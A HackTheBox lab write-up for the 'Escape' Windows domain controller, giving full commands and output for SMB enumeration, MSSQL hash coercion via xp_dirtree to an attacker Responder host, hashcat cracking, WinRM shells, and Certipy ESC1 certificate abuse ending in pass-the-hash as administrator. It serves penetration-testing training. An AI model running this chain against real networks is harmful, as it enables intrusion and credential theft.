---
title: "HackTheBox - Escape"
author: Nasrallah
description: ""
date: 2024-12-25 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, adcs, AD, mssql, crack, hashcat]
img_path: /assets/img/hackthebox/machines/escape
image:
    path: escape.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Escape](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/escape) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) has readable smb share where we find a pdf with mssql credentials, we login to the server and get the hash of the sql_svc, we crack it and get a shell with it. After that we find a vulnerable certificate that we exploit to get administrator.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-20 04:12:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn         
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-20T04:14:04+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject:                   
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel                                                                                                                     
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57                                                        
445/tcp  open  microsoft-ds?           
464/tcp  open  kpasswd5?               
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0   
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-20T04:14:02+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.199.72:1433: 
|     Version:                                                                                 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433                      
| ms-sql-ntlm-info: 
|   10.129.199.72:1433:                                                                        
|     Target_Name: sequel                                                                      
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC                                                                
|     DNS_Domain_Name: sequel.htb          
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-12-20T04:14:04+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-12-20T00:45:21
|_Not valid after:  2054-12-20T00:45:21
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-12-20T04:14:04+00:00; +7h59m58s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-20T04:14:02+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-time: 
|   date: 2024-12-20T04:13:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

The target seems to be an active directory domain controller with the domain name `sequel.htb`.

### SMB

Let's start by enumerating the smb service.

```terminal
[★]$ nxc smb sequel.htb -u 'guest' -p '' --shares
SMB         10.129.199.72   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.199.72   445    DC               [+] sequel.htb\guest: 
SMB         10.129.199.72   445    DC               [*] Enumerated shares
SMB         10.129.199.72   445    DC               Share           Permissions     Remark
SMB         10.129.199.72   445    DC               -----           -----------     ------
SMB         10.129.199.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.199.72   445    DC               C$                              Default share
SMB         10.129.199.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.199.72   445    DC               NETLOGON                        Logon server share 
SMB         10.129.199.72   445    DC               Public          READ            
SMB         10.129.199.72   445    DC               SYSVOL                          Logon server share 
```

We found a share called `Public` that we can read, let's access it.

```terminal
[★]$ smbclient //sequel.htb/Public -N             
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

                5184255 blocks of size 4096. 1464139 blocks available
smb: \> mget *.pdf
Get file SQL Server Procedures.pdf? y
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (39.4 KiloBytes/sec) (average 39.4 KiloBytes/sec)
```

We found a pdf file, let's open it.

![pdf](1.png)

We found credentials for the `MSSQL` service.

### MSSQL

We can use `impacket-msssqlclient` to connect.

```bash
[★]$ impacket-mssqlclient sequel.htb/PublicUser:'GuestUserCantWrite1'@10.129.199.72
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```

We authenticated successfully.

## **Foothold**

One of the things we can do is execute commands but I don't think it's enabled for a public user.

The other thing we can do is get the hash of the sql service using `xp_dirtree`

First we need to run `responder`.

```bash
sudo responder -I tun0
```

And now from the mssql prompt we run the following command

```shell
xp_dirtree \\10.10.16.7\asdf;
```

> change the ip to your tun0 ip

![hash](2.png)

We got the hash

```text
sql_svc::sequel:94ba7f2c0e9a1ada:E4B78ED4B621BFAC230DC795512AE267:0101000000000000807D56395C52DB012C4DEC37103148930000000002000800590054004F004E0001001E00570049004E002D003000380037005500310033004A004300410036004E0004003400570049004E002D003000380037005500310033004A004300410036004E002E00590054004F004E002E004C004F00430041004C0003001400590054004F004E002E004C004F00430041004C0005001400590054004F004E002E004C004F00430041004C0007000800807D56395C52DB01060004000200000008003000300000000000000000000000003000003A54335C9CE0625D4921379BA09962D83B14F53B2FBB6698008AEC13DD6F2A6E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0037000000000000000000
```

Now let's crack it.

```terminal
λ .\hashcat.exe hashes.txt rockyou.txt -m 5600       
hashcat (v6.2.6) starting        
                                 
OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]

Host memory required for this attack: 1335 MB
                                 
Dictionary cache hit:            
* Filename..: rockyou.txt        
* Passwords.: 14344384           
* Bytes.....: 139921497          
* Keyspace..: 14344384           
                                 
SQL_SVC::sequel:94ba7f2c0e9a1ada:e4b78ed4b621bfac230dc795512ae267:0101000000000000807d56395c52db012c4dec37103148930000000002000800590054004f004e0001001e00570049004e002d003000380037005500310033004a004300410036004e0004003400570049004e002d003000380037005500310033004a004300410036004e002e00590054004f004e002e004c004f00430041004c0003001400590054004f004e002e004c004f00430041004c0005001400590054004f004e002e004c004f00430041004c0007000800807d56395c52db01060004000200000008003000300000000000000000000000003000003a54335c9ce0625d4921379ba09962d83b14f53b2fbb6698008aec13dd6f2a6e0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000:REGGIE1234ronnie
                                 
Session..........: hashcat       
Status...........: Cracked       
Hash.Mode........: 5600 (NetNTLMv2)   
Hash.Target......: SQL_SVC::sequel:94ba7f2c0e9a1ada:e4b78ed4b621bfac23...000000                                                                                                                                                               
Time.Started.....: Thu Dec 19 21:27:47 2024 (12 secs)
Time.Estimated...: Thu Dec 19 21:27:59 2024 (0 secs) 
Kernel.Feature...: Pure Kernel   
Guess.Base.......: File (rockyou.txt) 
Guess.Queue......: 1/1 (100.00%) 
Speed.#1.........:   913.4 kH/s (10.31ms) @ Accel:16 Loops:1 Thr:64 Vec:1                                                                                                                                                                     
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)                                                                                                                                                                 
Progress.........: 10715136/14344384 (74.70%)
Rejected.........: 0/10715136 (0.00%) 
Restore.Point....: 10616832/14344384 (74.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator   
Candidates.#1....: Sabnod -> Q11200329
                                 
Started: Thu Dec 19 21:27:38 2024
Stopped: Thu Dec 19 21:28:01 2024
                                 
C:\Users\Sirius\Apps\hashcat     
```

The hash cracked to `REGGIE1234ronnie`.

Netexec shows that we can loggins via winrm

```terminal
[★]$ nxc winrm sequel.htb -u sql_svc -p REGGIE1234ronnie  
WINRM       10.129.199.72   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.129.199.72   5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

Let's use `evil-winrm` for a shell.

```terminal
[★]$ evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

## **Privilege Escalation**

### sql_svc -> ryan.cooper

On the C drive we find a directory called `sqlserver` with a log directory, inside that we find an `ERRORLOG.bak` file.

```terminal
*Evil-WinRM* PS C:\sqlserver\Logs> ls


    Directory: C:\sqlserver\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\sqlserver\Logs>
```

Printing the file we find interesting stuff.

```terminal
[...]
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
[...]
```

We see two failed login, onw for user `ryan.cooper` and the second looks like a password.

I assume that user `ryan` mistyped his password as username.

Let's see if we can login as `ryan.cooper` with that password.

```terminal
[★]$ evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>]
```

### Ryan.cooper -> Administrator

We need to enumerate the Certificate Services

```terminal
[★]$ certipy find -vulnerable -u ryan.cooper -p 'NuclearMosquito3' -dc-ip 10.129.199.72 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                         
                                                                                               
[*] Finding certificate templates                                                              
[*] Found 34 certificate templates                                                             
[*] Finding certificate authorities                                                            
[*] Found 1 certificate authority                                                              
[*] Found 12 enabled certificate templates                                                     
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA                                 
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP     
[*] Got CA configuration for 'sequel-DC-CA'                                                    
[*] Enumeration output:                                                                                                                                                                       
Certificate Authorities                       
  0                                                                                            
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue 
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates                                                                          
  0                                                                                            
    Template Name                       : UserAuthentication          
    Display Name                        : UserAuthentication      
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True                                                                                                                                                
    Client Authentication               : True
    Enrollment Agent                    : False 
    Any Purpose                         : False 
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False 
    Requires Key Archival               : False 
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
                                                                                                               
```

We found the cert `sequel-DC-CA` and it's vulnerable to [ESC1](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1).

To exploit this we will need to get a pfx certificate using the following command:

```bash
certipy req -username ryan.cooper@sequel.htb -password 'NuclearMosquito3' -ca sequel-DC-CA -target sequel.htb -template UserAuthentication -upn administrator@sequel.htb -dns dc.sequ
el.htb
```

```terminal
[★]$ certipy req -username ryan.cooper@sequel.htb -password 'NuclearMosquito3' -ca sequel-DC-CA -target sequel.htb -template UserAuthentication -upn administrator@sequel.htb -dns dc.sequ
el.htb                
Certipy v4.8.2 - by Oliver Lyak (ly4k) 
                                               
[*] Requesting certificate via RPC
[*] Successfully requested certificate       
[*] Request ID is 17    
[*] Got certificate with multiple identifications
    UPN: 'administrator@sequel.htb'                                                            
    DNS Host Name: 'dc.sequel.htb'                                                             
[*] Certificate has no object SID                                                                                                                                                             
[*] Saved certificate and private key to 'administrator_dc.pfx'
```

Now we use the certificate to get the administrator ntlm hash

```shell
certipy auth -pfx administrator_dc.pfx -dc-ip 10.129.199.72
```

```terminal
[★]$ certipy auth -pfx administrator_dc.pfx -dc-ip 10.129.199.72
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@sequel.htb'
    [1] DNS Host Name: 'dc.sequel.htb'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

We got the kerberos clock error, We need to have the same clock time as the target, for that we can use `sudo rdate -n sequel.htb`

```terminal
[★]$ certipy auth -pfx administrator_dc.pfx -dc-ip 10.129.199.72
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@sequel.htb'
    [1] DNS Host Name: 'dc.sequel.htb'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

We got the hash, now we do pass-the-hash to get a shell via winrm.

```terminal
[★]$ evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

## **Prevention and Mitigation**

## **References**

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
